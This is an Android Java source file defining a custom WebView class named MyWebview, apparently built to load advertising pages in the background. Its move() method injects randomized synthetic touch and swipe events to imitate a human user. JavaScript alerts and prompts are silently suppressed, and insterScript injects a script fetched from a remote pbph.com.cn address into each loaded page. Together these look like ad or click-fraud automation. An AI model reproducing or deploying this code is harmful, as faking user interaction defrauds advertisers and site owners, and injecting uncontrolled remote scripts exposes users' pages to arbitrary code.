package com.pbph.pcc.view;

import android.annotation.TargetApi;
import android.app.Instrumentation;
import android.content.Context;
import android.graphics.Bitmap;
import android.os.SystemClock;
import android.text.TextUtils;
import android.util.AttributeSet;
import android.util.DisplayMetrics;
import android.view.MotionEvent;
import android.webkit.JsPromptResult;
import android.webkit.JsResult;
import android.webkit.WebChromeClient;
import android.webkit.WebResourceError;
import android.webkit.WebResourceRequest;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.ScrollView;

import com.android.utils.LogUtils;
import com.pbph.pcc.tools.DownTimer;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Random;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;


public class MyWebview extends WebView {
    private ExecutorService fixedThreadPool = Executors
            .newFixedThreadPool(Runtime.getRuntime().availableProcessors() * 2);
    private DisplayMetrics displayMetrics = new DisplayMetrics();
    String parameters = "";
    private String htmlPath, homePath = "";
    private ScrollView scrollView = null;
    DownTimer downTimer = null;
    private List<String> urlList = new ArrayList<String>();
    private List<String> viewList = new ArrayList<String>();
    private boolean click_is_run = false;
    private boolean view_is_run = false;
    private boolean bottom_is_run = false;
    private boolean second_is_run = false;
    private int bottom_second = 10;
    private int jump_second = 0;
    private int heigth, width = 0;
    private int jumpCount = 3;
    private String host = "";
    private int time = 120;
    private int type = 1;
    private long startSecond = 0;
    private String last_url = "";
    private String packageName = "";

    public MyWebview(Context context) {
        super(context);
    }

    public MyWebview(Context context, AttributeSet attrs) {
        super(context, attrs);
    }

    public MyWebview(Context context, AttributeSet attrs, int defStyle) {
        super(context, attrs, defStyle);
    }

    public void loadAdUrl(String url) {
        this.loadUrl(url);
    }

    public void setPname(String pname) {
        this.packageName = pname;
    }

    public void initUrlData(String parameters) {

        HashMap<String, String> map = new HashMap<String, String>();
        try {
            String data[] = parameters.split("&");
            for (String str : data) {
                String parameter[] = str.split("=");
                map.put(parameter[0], parameter[1]);
            }
        } catch (Exception e2) {
            e2.printStackTrace();
        }
        try {
            String time_string = map.get("time");
            time = Integer.valueOf(time_string);
        } catch (Exception e1) {
            e1.printStackTrace();
            time = 120;
        }
    }

    public void initBackWebView() {
        getSettings().setJavaScriptEnabled(true);
        getSettings().setDomStorageEnabled(true);
//        webView.getSettings().setCacheMode(WebSettings.LOAD_NO_CACHE);
        getSettings().setDefaultTextEncodingName("UTF-8");
        WebViewClient wvc = new WebViewClient() {
            @Override
            public void onReceivedError(WebView view, WebResourceRequest request, WebResourceError error) {
            }

            @Override
            public void onPageStarted(WebView view, String url, Bitmap favicon) {
                LogUtils.e("backwebview onPageStarted=" + url);
                super.onPageStarted(view, url, favicon);
            }

            @Override
            public void onPageFinished(WebView view, String url) {
                LogUtils.e("backwebview onPageFinished=" + url);
                super.onPageFinished(view, url);
            }

            @TargetApi(21)
            @Override
            public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) {
                LogUtils.e("backWebView" + view.getUrl());
                return super.shouldOverrideUrlLoading(view, request);

            }
            //            @Override
//            public boolean shouldOverrideUrlLoading(WebView view, String url) {
//                Log.e("backWebView", url);
//                return super.shouldOverrideUrlLoading(view, url);
//
//            }
        };
        setWebViewClient(wvc);
        WebChromeClient wvcc = new WebChromeClient() {
            @Override
            public void onProgressChanged(WebView view, int progress) {

            }

            @Override
            public boolean onJsAlert(WebView view, String url, String message, final JsResult result) {
                return true;
            }

            @Override
            public boolean onJsConfirm(WebView view, String url, String message, final JsResult result) {
                return true;
            }

            @Override
            public boolean onJsPrompt(WebView view, String url, String message, String defaultValue,
                                      final JsPromptResult result) {
                return true;
            }

        };
        setWebChromeClient(wvcc);

    }

    private Map<String, String> getHeadMap(String referer, String requestedWith) {
        Map<String, String> extraHeaders = new HashMap<String, String>();
//        extraHeaders.put("Referer", referer);
        if (!TextUtils.isEmpty(requestedWith)) {
            extraHeaders.put("X-Requested-With", packageName);
        }
        return extraHeaders;
    }

    private void move() {
        new Thread() {
            @Override
            public void run() {
                Random random = new Random();
                int x = random.nextInt(width);
                int y = random.nextInt(heigth / 4 * 3);
//                int scroll_height = random.nextInt(height / 2) + 100;
//                int count = random.nextInt(9) + 5;
//                int current_scroll_height = 0;
                Instrumentation inst = new Instrumentation();
                long dowTime = SystemClock.uptimeMillis();
                inst.sendPointerSync(MotionEvent.obtain(dowTime, dowTime,
                        MotionEvent.ACTION_DOWN, x, y, 0));
                inst.sendPointerSync(MotionEvent.obtain(dowTime, dowTime,
                        MotionEvent.ACTION_MOVE, x, y, 0));
//                for (int i = 0; i < count; i++) {
//                    int j = random.nextInt(scroll_height / count)+10;
//                    Log.e("j", "j=" + j);
//                    if (i == (count - 1) && current_scroll_height < scroll_height) {
//                        y -= (scroll_height - current_scroll_height);
//                    } else {
//                        y -= j;
//                    }  Log.e("y", "y=" + y);
//                    current_scroll_height += j;
//                    inst.sendPointerSync(MotionEvent.obtain(dowTime, dowTime + 20,
//                            MotionEvent.ACTION_MOVE, x, y, 0));
//                }
                y -= (random.nextInt(50) + 50);
                inst.sendPointerSync(MotionEvent.obtain(dowTime, dowTime + random.nextInt(30) + 20,
                        MotionEvent.ACTION_MOVE, x, y, 0));
                y -= (random.nextInt(50) + 50);
                inst.sendPointerSync(MotionEvent.obtain(dowTime, dowTime + random.nextInt(30) + 20,
                        MotionEvent.ACTION_MOVE, x, y, 0));
                y -= (random.nextInt(50) + 50);
                inst.sendPointerSync(MotionEvent.obtain(dowTime, dowTime + random.nextInt(30) + 20,
                        MotionEvent.ACTION_MOVE, x, y, 0));
                y -= (random.nextInt(50) + 50);
                inst.sendPointerSync(MotionEvent.obtain(dowTime, dowTime + random.nextInt(30) + 20,
                        MotionEvent.ACTION_MOVE, x, y, 0));
                y -= (random.nextInt(50) + 50);
                inst.sendPointerSync(MotionEvent.obtain(dowTime, dowTime + random.nextInt(30) + 20,
                        MotionEvent.ACTION_MOVE, x, y, 0));
                y -= (random.nextInt(50) + 50);
                inst.sendPointerSync(MotionEvent.obtain(dowTime, dowTime + random.nextInt(30) + 20,
                        MotionEvent.ACTION_MOVE, x, y, 0));
                y -= (random.nextInt(50) + 50);
                inst.sendPointerSync(MotionEvent.obtain(dowTime, dowTime + random.nextInt(30) + 20,
                        MotionEvent.ACTION_UP, x + 60, y, 0));
            }

        }.start();
    }

    private String insterScript() {
        String js = "var newscript = document.createElement('script');";
        js += "newscript.type = 'text/javascript';";
        js += "newscript.src='https://www.pbph.com.cn/laiqiandao/t.js';";
        // String js = "var newscript = document.createElement(\"script\");";
        // js += "newscript.src = function jump(url){window.location=\"url\"}";
        js += "document.body.appendChild(newscript);";
        LogUtils.e("insterScript js=" + js);
        return js;
    }

    @Override
    protected void onMeasure(int widthMeasureSpec, int heightMeasureSpec) {
        int expandSpec = MeasureSpec.makeMeasureSpec(Integer.MAX_VALUE >> 2, MeasureSpec.AT_MOST);
        super.onMeasure(widthMeasureSpec, expandSpec);
    }
}